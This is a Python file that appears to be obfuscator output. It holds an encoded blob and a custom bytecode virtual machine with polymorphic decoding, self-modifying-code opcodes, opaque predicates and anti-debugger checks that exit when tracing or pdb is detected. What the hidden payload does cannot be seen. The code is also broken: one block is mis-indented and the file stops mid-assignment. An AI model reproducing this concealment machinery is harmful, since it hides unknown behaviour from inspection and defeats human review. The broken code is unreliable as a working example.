#!/usr/bin/env python3
def _gmcwfn(_pvgtahu):
    return _pvgtahu % 650 + 1

import hashlib as _yrlempei, hmac as _fhqaf, base64 as _asflqdhje, sys as _ndbvr, zlib as _vihzuzgez
_pvgtahu = 294701
_nrnsk = """/NvhRFaxVBuvOTPSsS85W9+QP5LnfEBIg+BxoxGQz8H4tSULD6bMpcH4H111+TQ6qApR7YrJ70hXz395ptXy2cZ/2yevoSiO6jJLNUlyu5uROL7QTdKcnSY0acJ1x2Zr0hoOBJXHb1sQuADSjV/zIdaSLth81SFTtLn4+GRlL+r57nFiKW/fURm5af1gzDVlq94KCKSvfiZs8lfLqB4BboYbshyOM2mu8h/EsMfa2p30xWireBUprxt5thmtaK5JnZpM8yWcW2IsXSg49islPSHtRWxpHDGvGQD4bss3NxmRJYjPkHVwvwRkIreF0i+SrRTHFWYxkVc26Wb1IIvsL/WZQYtDXrHPid5kb0Ba868rfD9ihodyuBhuXEWXdwhdHMqUfWv6mMhnQk1kMlhYV/qYHFLFyCGycibYsP2ry+NP8LbxzIruFRXrC/PM2srWGaUoRFC312xstOaqIhH05GjWYmdxOJLdKhQATLBr+f0OTtqLaeb+OgF64bZr/kh8AiVNDjOxVpFSY3EYZ/GqVMm2WPW2mQfUsjvu6vVtzL7INKfdYDhkwLQDFojne7suvPef7yYhiSCQx8vlv3eqJlluhULdO/nTLw5bDRJI+itmcQ33d3Q1xytBjYVPKEjVFbigVXYySIGUlr+00iPvh6sw2UwTLrKvXzBTz1AKfJluy89CKNM/KIHangvmZL4tvQCP0WxA7pD3LbP5wuY8g67w/35OAPjp/eqyqoFVA9jg/z2eO9i0AK8xvVOxRRlu02u9t/vBfM0qlb1hjG4RjPN/HkOvdvcl84H+dpInBVQnXc3q+peMwZZZ1CNqNwt6Y/QuYAEKz4qimlPHts6LGgYyvOSPVDkY2CLie8jV3qZnmNZTNATrKI1Fa5DXH7LXv4khtX98BaidEkQlG34ppQF2S45ANuOM16k="""
_mpacuinyx = 3
_ewqgz = _gmcwfn(_pvgtahu)

def _vm_decode_vl(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        _op = _m[_tag & 0x0F]
        _rd = _rm[(_c[_p+1] >> 4) & 0x0F] if _c[_p+1] < 64 else 0
        _rs1 = _rm[_c[_p+1] & 0x0F] if (_c[_p+1] & 0x0F) < 64 else 0
        return _op, _rd, _rs1, 0, 0, 2
    elif _cls == 1:
        _op = _m[_tag & 0x1F]
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _rd = _rm[(_b1 >> 4) & 0x0F] if ((_b1 >> 4) & 0x0F) < 64 else 0
        _rs1 = _rm[_b1 & 0x0F] if (_b1 & 0x0F) < 64 else 0
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _imm = _b2 | (_b3 << 8)
        if _imm & 0x8000:
            _imm = _imm | (-1 << 16)
        return _op, _rd, _rs1, 0, _imm, 4
    elif _cls == 2:
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
        _op = _m[_b1 & 0xFF]
        _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
        _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
        _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        return _op, _rd, _rs1, _rs2, _imm, 9
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

# Polymorphic decoder (handles variant detection)
def _vm_decode_poly(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        # Short class — try variants
        if _p + 2 <= len(_c) and (_p + 2 >= len(_c) or (_c[_p+2] ^ _k[(_p+2) % 32]) & 0xC0 == 0):
            # Variant 0 (standard 2B) or detect by checking if next byte looks valid
            _rd_raw = (_c[_p+1] ^ _k[(_p+1) % 32])
            _rd = _rm[(_rd_raw >> 4) & 0x0F] if (_rd_raw >> 4 & 0x0F) < 64 else 0
            _rs1 = _rm[_rd_raw & 0x0F] if (_rd_raw & 0x0F) < 64 else 0
            return _m[_tag & 0x0F], _rd, _rs1, 0, 0, 2
        if _p + 3 <= len(_c):
            # Variant 1 (3B interleaved)
            # Encoding: tag bits 3-2=rd[1:0], tag bits 1-0=op[3:2]
            #           out[1] bits 7-6=op[1:0], bits 5-2=rs1[3:0], bits 1-0=rd[4:3]
            #           out[2] bits 3-0=op[7:4]
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _op_v1 = ((_b2 & 0x0F) << 4) | ((_tag & 0x03) << 2) | ((_b1 >> 6) & 0x03)
            _rd_v1 = ((_b1 & 0x03) << 2) | ((_tag >> 2) & 0x03)
            _rs1_v1 = (_b1 >> 2) & 0x0F
            if _rd_v1 < 64:
                return _m[_op_v1 & 0xFF], _rm[_rd_v1] if _rd_v1 < 64 else 0, _rm[_rs1_v1] if _rs1_v1 < 64 else 0, 0, 0, 3
            # Variant 2 (3B scattered)
            _scat = _tag & 0x0F
            _op_lo2 = (_b1 >> 6) & 0x03
            _rd_bits = (_b1 >> 2) & 0x0F
            _rs1_hi2 = _b1 & 0x03
            _rs1_lo2 = (_b2 >> 6) & 0x03
            _scat_hi = (_b2 >> 2) & 0x0F
            _op_hi2 = _b2 & 0x30
            _op2 = ((_scat_hi << 4) | _op_hi2 | _op_lo2) & 0xFF
            _rs1_val = (_rs1_hi2 << 2) | _rs1_lo2
            if _rd_bits < 64:
                return _m[_op2], _rm[_rd_bits], _rm[_rs1_val] if _rs1_val < 64 else 0, 0, 0, 3
        # Fallback
        return _m[_tag & 0x0F], 0, 0, 0, 0, 2
    elif _cls == 1:
        # Medium class — use tag bit 5 for disambiguation
        _vbit = (_tag & 0x20) != 0
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _rd0 = (_b1 >> 4) & 0x0F
        _rs1_0 = _b1 & 0x0F
        if _p + 4 <= len(_c) and not _vbit:
            # Variant 0 (standard, bit 5 = 0)
            _op0 = _tag & 0x1F
            _imm0 = _b2 | (_b3 << 8)
            if _imm0 & 0x8000:
                _imm0 = _imm0 | (-1 << 16)
            return _m[_op0], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm0, 4
        elif _vbit and _p + 4 <= len(_c):
            # Variant 1 (imm in tag, bit 5 = 1)
            _op1 = (_b3 >> 3) & 0x1F
            _imm_lo = _tag & 0x1F
            _imm_hi = (_b2 | ((_b3 & 0x07) << 8))
            _imm1 = (_imm_hi << 5) | _imm_lo
            if _imm1 & 0x8000:
                _imm1 = _imm1 | (-1 << 16)
            return _m[_op1], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm1, 4
        # Fallback
        return 0, 0, 0, 0, 0, 2
    elif _cls == 2:
        # Long class
        _variant = (_tag >> 2) & 0x0F
        if _variant == 0 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 1 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b2 & 0xFF]
            _rd = _rm[_b1 & 0x3F] if (_b1 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 2 and _p + 10 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _i0 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i1 = _c[_p+8] ^ _k[(_p+8) % 32]
            _i2 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i3 = _c[_p+6] ^ _k[(_p+6) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 10
        # Fallback
        if _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        return 0, 0, 0, 0, 0, 2
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key, _vl_flag, _poly_flag=False):
    import sys
    if sys.gettrace() is not None: sys.exit(1)
    if any(x in globals() for x in ['pdb', 'inspect', 'trace']): sys.exit(1)
    import random
    _reg_map = list(range(64))
    random.shuffle(_reg_map)
    _r = [None] * 64
    _ip = 0
    _cycle = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    _spill_stack = []
    _handler_stack = []
    _vm_flags = 0
    _smc_key = random.getrandbits(32)
        if _poly_flag:
            _decode = lambda: _vm_decode_poly(_code, _ip, _op_key, _map, _reg_map)
        elif _vl_flag:
            _decode = lambda: _vm_decode_vl(_code, _ip, _op_key, _map, _reg_map)
        else:
            _decode = lambda: _vm_decode_fixed(_code, _ip, _op_key, _map, _reg_map)
    while _ip < _n:
        _cycle += 1
        _op, _rd, _rs1, _rs2, _imm, _ilen = _decode()
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            if _vl_flag:
                _ip = _imm
            else:
                _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 32:
            if not _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _r[_rd] = _names[_rd](*[_r[_rs1 + _i] for _i in range(_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _r[_rd] = tuple(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 44:
            _r[_rd] = list(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if not (_v + 1 == _v): pass
                elif _imm == 1:
                    if not (_v != _v): pass
                else:
                    if not (_v - 1 == _v): pass
            except TypeError:
                pass
        elif _op == 53:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if _v * 0 != 0: pass
                elif _imm == 1:
                    if _v != _v: pass
                else:
                    if _v + 1 == _v: pass
            except TypeError:
                pass

        # ─── Indirect & Virtual Call ───
        elif _op == 80:
            _fn = _r[_rs1]
            _argc = _imm & 0xFFFF
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_argc))
            _r[_rd] = _fn(*_args)
        elif _op == 81:
            _obj = _r[_rs1]
            _vtable = _r[_rs1 + 1]
            _midx = _imm & 0xFFFF
            _argc = (_imm >> 16) & 0xFFFF
            _method = _vtable[_midx]
            _args = tuple(_r[_rs1 + 2 + _i] for _i in range(_argc))
            _r[_rd] = _method(_obj, *_args)

        # ─── Exception Handling ───
        elif _op == 90:
            _handler_stack.append({'s': _ip, 'e': _ip + _imm, 'c': None, 't': None})
        elif _op == 91:
            if _handler_stack:
                _handler_stack[-1]['t'] = _r[_rd]
                _handler_stack[-1]['c'] = _ip + _ilen
        elif _op == 92:
            _exc = _r[_rs1]
            _found = False
            for _h in reversed(_handler_stack):
                if _h['s'] <= _ip <= _h['e']:
                    if _h['t'] is None or isinstance(_exc, _h['t']):
                        _ip = _h['c']
                        _r[_rs1] = _exc
                        _found = True
                        break
            if not _found:
                raise _exc
            continue
        elif _op == 93:
            if _handler_stack:
                _handler_stack.pop()

        # ─── Obfuscated Conditional Branching ───
        elif _op == 100:
            _v = _r[_rd]
            _t1 = (_v & _v) | _v
            _t2 = (_t1 ^ 0) + 0
            _t3 = _t2 ^ _t2
            if _t3 == 0:
                if _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 101:
            _v = _r[_rd]
            _t1 = _v | 0
            _t2 = _t1 & _t1
            if (_t2 ^ _t2) == 0:
                if not _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 102:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rd] ^ _r[_rd] if isinstance(_r[_rd], int) else 0
            if _o == 0:
                if _d == 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 103:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _m = _r[_rd] | 0 if isinstance(_r[_rd], int) else 0
            if _m == _m:
                if _d != 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 104:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _t = (_d ^ _d) & 0
            if _t == 0:
                if _d < 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 105:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rs1] ^ _r[_rs1] if isinstance(_r[_rs1], int) else 0
            if _o == 0:
                if _d <= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 106:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            if (_d * 0) == 0:
                if _d > 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 107:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _v = _r[_rd] & 0xFFFFFFFF if isinstance(_r[_rd], int) else 0
            if (_v ^ _v) == 0:
                if _d >= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 108:
            _target = _r[_rd]
            if isinstance(_target, int) and 0 <= _target < _n:
                _ip = _target
            else:
                _ip = 0
            continue
        elif _op == 109:
            _idx = _r[_rd]
            _table_base = _imm & 0xFFFF
            _default_off = (_imm >> 16) & 0xFFFF
            _num_entries = _rs1 & 0xFF
            if isinstance(_idx, int) and 0 <= _idx < _num_entries:
                _entry_off = _table_base + _idx * 4
                if _entry_off + 4 <= _n:
                    _off = (_code[_entry_off] | (_code[_entry_off+1] << 8) | (_code[_entry_off+2] << 16) | (_code[_entry_off+3] << 24))
                    _ip += _off
                else:
                    _ip += _default_off
            else:
                _ip += _default_off
            continue

        # ─── Register Spilling ───
        elif _op == 120:
            _spill_stack.append(_r[_rd])
        elif _op == 121:
            if _spill_stack:
                _r[_rd] = _spill_stack.pop()
        elif _op == 122:
            _mask = _imm & 0xFFFF
            for _b in range(16):
                if _mask & (1 << _b):
                    _reg = _rd + _b
                    if _reg < 64 and _reg < len(_r):
                        _spill_stack.append(_r[_reg])
                        _r[_reg] = None
        elif _op == 123:
            _cnt = _imm & 0xFF
            for _ in range(min(_cnt, len(_spill_stack))):
                _spill_stack.pop()

        # ─── Self-Modifying Code ───
        elif _op == 130:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _ks = _key.to_bytes(8, 'little')
                    for _i in range(min(_plen, 8)):
                        _code[_off + _i] ^= _ks[_i % len(_ks)]
        elif _op == 131:
            _shuf = _rd & 0xFF
            _new_op = _rs1 & 0xFF
            if _shuf < 256:
                _map[_shuf] = _new_op
        elif _op == 132:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF
        elif _op == 133:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF

        # ─── Data Obfuscation ───
        elif _op == 140:
            _v = _r[_rs1]
            _t = (_v ^ _v) & 0
            _r[_rd] = _t | _v
        elif _op == 141:
            _v = _r[_rs1] + _r[_rs2]
            _m = _r[_rs1] ^ _r[_rs2]
            _r[_rd] = _v + _m - _m
        elif _op == 142:
            _v = _r[_rs1]
            _k = _r[_rs2]
            if isinstance(_v, int) and isinstance(_k, int):
                _r[_rd] = (_v | _k) - (_v & _k) + (_v & _k) - (_v | _k) + (_v ^ _k)
            else:
                _r[_rd] = _v

        # ─── Control Flow Integrity (opcodes 150-152) ───
        elif _op == 150:
            _exp_lo = _rd & 0xFF
            _exp_mid = _rs1 & 0xFF
            _exp_hi = _rs2 & 0xFF
            _exp_top = (_imm >> 24) & 0xFF if _imm < 0 else (_imm >> 24) & 0xFF
            _expected = _exp_lo | (_exp_mid << 8) | (_exp_hi << 16) | (_exp_top << 24)
            _csum = 0xFFFFFFFF
            _start = _ip - _ilen if _ip >= _ilen else 0
            _end = _ip + 1
            for _ci in range(_start, min(_end, len(_code))):
                _csum ^= _code[_ci]
                _csum = ((_csum << 7) | (_csum >> 25)) & 0xFFFFFFFF
                _csum ^= (_csum >> 13)
            _csum ^= 0xFFFFFFFF
            if (_csum & 0xFFFFFFFF) != (_expected & 0xFFFFFFFF):
                import sys
                sys.stderr.write('error: CFI violation detected\\n')
                sys.exit(1)
        elif _op == 151:
            import sys
            sys.stderr.write('error: integrity failure\\n')
            sys.exit(1)
        elif _op == 152:
            pass

        # ─── Constant Decryption (opcode 160) ───
        elif _op == 160:
            _r[_rd] = _consts[_imm]
            if isinstance(_r[_rd], str):
                pass

        _ip += _ilen

def _vm_decode_fixed(_c, _p, _k, _m, _rm):
    _raw = _c[_p:_p+8]
    _dec = bytes([_raw[i] ^ _k[i % 32] for i in range(len(_raw))])
    _op = _m[_dec[0]]
    _rd = _rm[_dec[1] & 0x3F] if (_dec[1] & 0x3F) < 64 else 0
    _rs1 = _rm[_dec[2] & 0x3F] if (_dec[2] & 0x3F) < 64 else 0
    _rs2 = _rm[_dec[3] & 0x3F] if (_dec[3] & 0x3F) < 64 else 0
    _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
    return _op, _rd, _rs1, _rs2, _imm, 8

def _vm_deserialize(_data):
    import struct
    _op_key = _data[:32]
    _decrypted = _data[32:]
    _map = list(_decrypted[:256])
    _pos = 256
    _flags = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _vl_flag = (_flags & 1) != 0
    _poly_flag = (_flags & 8) != 0
    _const_enc = (_flags & 2) != 0
    _cfi_flag = (_flags & 4) != 0
    
    # Read constant encryption key (16 bytes if encrypted)
    _const_key = None
    if _const_enc:
        _const_key = _decrypted[_pos:_pos+16]; _pos += 16
    
    # Skip CFI table (if present)
    if _cfi_flag:
        _cfi_nb = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        for _ in range(_cfi_nb):
            _pos += 12  # skip start(4) + len(4) + csum(4)
    
    # Constants (with optional decryption)
    _cc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _decrypted[_pos]; _pos += 1
        _sl = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _s = _decrypted[_pos:_pos+_sl]; _pos += _sl
        # Decrypt string constants (type 4) if encryption is enabled
        if _const_enc and _t == 4 and _const_key:
            _dec_bytes = bytearray(len(_s))
            for _j in range(len(_s)):
                _dec_bytes[_j] = _s[_j] ^ _const_key[_j % 16]
            _s = bytes(_dec_bytes)
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 7: _v = _s
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_decrypted[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_decrypted[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    if _vl_flag or _poly_flag:
        _code_sz = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_code_sz]
    else:
        _ic = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_ic*8]
    return _code, _consts, _names, _map, _op_key, _vl_flag, _poly_flag


def _aohpaypd():
    if _ndbvr.gettrace() is not None:
        _ndbvr.stderr.write('error: debugger detected\n'); _ndbvr.exit(1)
    _byxuusddu = 